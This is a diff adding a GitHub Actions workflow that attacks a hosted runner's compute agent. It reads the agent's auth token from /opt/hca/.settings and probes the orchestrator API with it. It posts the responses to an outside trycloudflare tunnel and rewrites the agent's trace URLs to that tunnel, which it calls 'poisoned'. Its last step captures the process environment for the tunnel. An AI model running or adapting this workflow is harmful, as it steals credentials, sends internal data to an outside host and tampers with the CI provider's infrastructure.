@@ -1,0 +1,67 @@
+name: r9e-connect-rpc-routes-and-settings-tamper
+on:
+  workflow_dispatch:
+env:
+  TUNNEL: https://admitted-isp-museum-becomes.trycloudflare.com
+jobs:
+  r9e:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: P-A extract connect-RPC service/method candidates
+        run: |
+          echo "== service/method shaped strings =="
+          sudo strings -a /opt/hca/hosted-compute-agent 2>/dev/null | grep -oE '[a-z][a-z0-9_]*\.[vV][0-9][a-zA-Z0-9_.]*/[A-Z][A-Za-z]+' | sort -u | head -40 | tee /tmp/r9e-routes.txt
+          echo "== method-name words =="
+          sudo strings -a /opt/hca/hosted-compute-agent 2>/dev/null | grep -oE '^(Acquire|Complete|Get|List|Stream|Register|Heartbeat|Report|Update|Create|Watch|Cancel)[A-Z][A-Za-z]+$' | sort -u | head -30
+          echo "route candidates: $(wc -l < /tmp/r9e-routes.txt)"
+
+      - name: P-B probe routes (GET all; POST only read-only-named)
+        run: |
+          sudo cat /opt/hca/.settings > /tmp/r9e-settings.json
+          python3 - <<'EOF'
+          import json
+          s = json.load(open('/tmp/r9e-settings.json'))
+          open('/tmp/r9e-token','w').write(s['authToken'])
+          open('/tmp/r9e-orch','w').write(s.get('schedulerApiUrl','').rstrip('/'))
+          EOF
+          TOK=$(cat /tmp/r9e-token); ORCH=$(cat /tmp/r9e-orch)
+          echo "orchestrator: $(echo "$ORCH" | sed 's|https://||')"
+          : > /tmp/r9e-bodies
+          while read -r R; do
+            CODE=$(curl -sS -m 8 -o /tmp/r9e-body -w '%{http_code}' -H "Authorization: Bearer $TOK" "$ORCH/$R" 2>/dev/null || echo err)
+            [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && [ "$CODE" != "err" ] && echo "GET /$R -> $CODE ($(wc -c < /tmp/r9e-body 2>/dev/null) B)"
+            if [ "$CODE" != "404" ] && [ "$CODE" != "err" ]; then { echo "=== GET /$R ==="; head -c 2000 /tmp/r9e-body; echo; } >> /tmp/r9e-bodies; fi
+            if echo "$R" | grep -qE '/(Get|List|Status|Health|Info)'; then
+              CODE2=$(curl -sS -m 8 -o /tmp/r9e-body2 -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{}' "$ORCH/$R" 2>/dev/null || echo err)
+              [ "$CODE2" != "404" ] && echo "POST /$R -> $CODE2 ($(wc -c < /tmp/r9e-body2 2>/dev/null) B)"
+              if [ "$CODE2" != "404" ] && [ "$CODE2" != "err" ]; then { echo "=== POST /$R ==="; head -c 3000 /tmp/r9e-body2; echo; } >> /tmp/r9e-bodies; fi
+            fi
+          done < /tmp/r9e-routes.txt
+          echo "== raw root with token, OPTIONS =="
+          curl -sS -m 8 -o /dev/null -w 'OPTIONS /v1 -> %{http_code}\n' -X OPTIONS -H "Authorization: Bearer $TOK" "$ORCH/" 2>/dev/null || true
+          curl -sS -m 20 --data-binary @/tmp/r9e-bodies -X POST "$TUNNEL/r9b-ingest?file=r9e-route-bodies" >/dev/null 2>&1 || true
+
+      - name: P-C .settings integrity test (traceApiUrl redirect, revertible)
+        run: |
+          sudo cp /opt/hca/.settings /tmp/r9e-settings-backup.json
+          SHA1=$(sudo sha256sum /opt/hca/.settings | cut -d' ' -f1)
+          python3 - <<'EOF'
+          import json
+          s = json.load(open('/tmp/r9e-settings-backup.json'))
+          s['traceApiUrl'] = 'https://admitted-isp-museum-becomes.trycloudflare.com/v1/trace'
+          s['watchdogTraceApiUrl'] = 'https://admitted-isp-museum-becomes.trycloudflare.com/v1/trace'
+          open('/tmp/r9e-poison.json','w').write(json.dumps(s))
+          EOF
+          sudo cp /tmp/r9e-poison.json /opt/hca/.settings
+          echo "poisoned traceApiUrl -> tunnel; watching 45s for agent to use it"
+          for i in $(seq 1 9); do sleep 5; done
+          sudo cp /tmp/r9e-settings-backup.json /opt/hca/.settings
+          SHA2=$(sudo sha256sum /opt/hca/.settings | cut -d' ' -f1)
+          echo "restored: $([ "$SHA1" = "$SHA2" ] && echo yes || echo NO-MISMATCH)"
+          echo "(check reflect-log for /v1/trace hits — reported by engineer side)"
+
+      - name: P-D capture action-process env (to tunnel only)
+        uses: ./actions/r9-capture
